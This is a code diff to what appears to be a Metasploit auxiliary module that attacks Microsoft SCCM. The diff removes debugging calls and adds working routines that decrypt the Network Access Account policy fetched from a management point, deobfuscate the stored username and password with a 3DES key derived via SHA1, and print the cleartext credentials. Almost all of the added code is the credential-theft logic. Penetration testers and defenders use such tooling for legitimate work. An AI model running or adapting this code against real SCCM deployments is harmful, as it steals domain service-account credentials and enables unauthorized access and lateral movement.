@@ -2,7 +2,6 @@
 # This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
-require 'pry-byebug'
 require 'time'
 require 'nokogiri'
 require 'rasn1'
@@ -66,7 +65,7 @@ class MetasploitModule < Msf::Auxiliary
     raw_obj = raw_objects.first
 
     raw_objects.each do |ro|
-      print_good("Found Management Point: #{ro[:dnshostname].first} (Site code: #{ro[:mssmssitecode].first})")
+      print_status("Found Management Point: #{ro[:dnshostname].first} (Site code: #{ro[:mssmssitecode].first})")
     end
 
     if raw_objects.length > 1
@@ -123,10 +122,13 @@ class MetasploitModule < Msf::Auxiliary
 
       sms_id = register_request(http_opts, mp, key, cert)
       duration = 5
-      print_line("Waiting #{duration} seconds for SCCM DB to update...")
+      print_status("Waiting #{duration} seconds for SCCM DB to update...")
       sleep(duration)
       naa_policy_url = get_policies(http_opts, mp, key, cert, sms_id)
-      request_policy(http_opts, naa_policy_url, sms_id, key)
+      decrypted_policy = request_policy(http_opts, naa_policy_url, sms_id, key)
+      username, password = get_creds_from_policy_doc(decrypted_policy)
+
+      print_good("Found valid NAA creds: #{username}:#{password}")
     end
   rescue Errno::ECONNRESET
     fail_with(Failure::Disconnected, 'The connection was reset.')
@@ -158,10 +160,47 @@ class MetasploitModule < Msf::Auxiliary
     http_response = send_request_cgi(opts)
     http_response.gzip_decode!
 
-    binding.pry
     ci = Rex::Proto::CryptoAsn1::Cms::ContentInfo.parse(http_response.body)
-    e = ci.enveloped_data
-    binding.pry
+    cms_envelope = ci.enveloped_data
+
+    ri = cms_envelope[:recipient_infos]
+    if ri.length < 1
+      fail_with(Failure::UnexpectedReply, 'No recipient infos provided')
+    end
+
+    if ri[0][:ktri].nil?
+      fail_with(Failure::UnexpectedReply, 'KeyTransRecipientInfo not found')
+    end
+
+    body = cms_envelope[:encrypted_content_info][:encrypted_content].value
+
+    key_encryption_alg = ri[0][:ktri][:key_encryption_algorithm][:algorithm].value
+    encrypted_rsa_key = ri[0][:ktri][:encrypted_key].value
+    if key_encryption_alg == Rex::Proto::CryptoAsn1::OIDs::OID_RSAES_OAEP.value
+      decrypted_key = key.private_decrypt(encrypted_rsa_key, OpenSSL::PKey::RSA::PKCS1_OAEP_PADDING)
+    else
+      fail_with(Failure::UnexpectedReply, "Unexpected key encryption routine: #{key_encryption_alg}")
+    end
+
+    cea = cms_envelope[:encrypted_content_info][:content_encryption_algorithm]
+    if cea[:algorithm].value == Rex::Proto::CryptoAsn1::OIDs::OID_AES256_CBC.value
+      if decrypted_key.length != 32
+        fail_with(Failure::UnexpectedReply, "Bad key length: #{decrypted_key.length}")
+      end
+      iv = RASN1::Types::OctetString.new
+      iv.parse!(cea[:parameters].value)
+      if iv.value.length != 16
+        fail_with(Failure::UnexpectedReply, "Bad IV length: #{iv.length}")
+      end
+      cipher = OpenSSL::Cipher::AES.new(256, :CBC)
+      cipher.decrypt
+      cipher.key = decrypted_key
+      cipher.iv = iv.value
+
+      decrypted = cipher.update(body) + cipher.final
+    end
+
+    decrypted.force_encoding('utf-16le').encode('utf-8').delete_suffix("\x00")
   end
 
   def get_policies(http_opts, mp, key, cert, sms_id)
@@ -207,7 +246,7 @@ class MetasploitModule < Msf::Auxiliary
       fail_with(Failure::UnexpectedReply, 'Did not retrieve NAA Policy path')
     end
 
-    print_good("Got NAA Policy URL: #{naa_policy_url}")
+    print_status("Got NAA Policy URL: #{naa_policy_url}")
 
     naa_policy_url
   end
@@ -271,9 +310,60 @@ class MetasploitModule < Msf::Auxiliary
     if sms_id.nil?
       fail_with(Failure::UnexpectedReply, 'Did not retrieve SMS ID')
     end
-    print_good("Got SMS ID: #{sms_id}")
+    print_status("Got SMS ID: #{sms_id}")
 
     sms_id
+  end
+
+  def get_creds_from_policy_doc(policy)
+    xml_doc = Nokogiri::XML(policy)
+    naa_section = xml_doc.xpath(".//instance[@class='CCM_NetworkAccessAccount']")
+    username = naa_section.xpath("//property[@name='NetworkAccessUsername']/value").text
+    password = naa_section.xpath("//property[@name='NetworkAccessPassword']/value").text
+
+    username = deobfuscate_policy_value(username)
+    password = deobfuscate_policy_value(password)
+
+    [username, password]
+  end
+
+  def deobfuscate_policy_value(value)
+    value = [value.gsub(/[^0-9A-Fa-f]/,'')].pack('H*')
+    data_length = value[52..55].unpack('I')[0]
+    buffer = value[64..64+data_length-1]
+    key = mscrypt_derive_key_sha1(value[4..43])
+    iv = "\x00"*8
+    cipher = OpenSSL::Cipher.new('des-ede3-cbc')
+    cipher.decrypt
+    cipher.iv = iv
+    cipher.key = key
+    result = cipher.update(buffer) + cipher.final
+
+    result.force_encoding('utf-16le').encode('utf-8')
+  end
+
+  def mscrypt_derive_key_sha1(secret)
+    buf1 = [0x36] * 64
+    buf2 = [0x5C] * 64
+
+    digest = OpenSSL::Digest::SHA1.new
+    hash = digest.digest(secret).bytes
+
+    hash.each_with_index do |byte, i|
+      buf1[i] ^= byte
+      buf2[i] ^= byte
+    end
+
+    buf1 = buf1.pack('C*')
+    buf2 = buf2.pack('C*')
+
+    digest = OpenSSL::Digest::SHA1.new
+    hash1 = digest.digest(buf1)
+
+    digest = OpenSSL::Digest::SHA1.new
+    hash2 = digest.digest(buf2)
+
+    hash1 + hash2[0..3]
   end
 
   def generate_key_and_cert(subject)
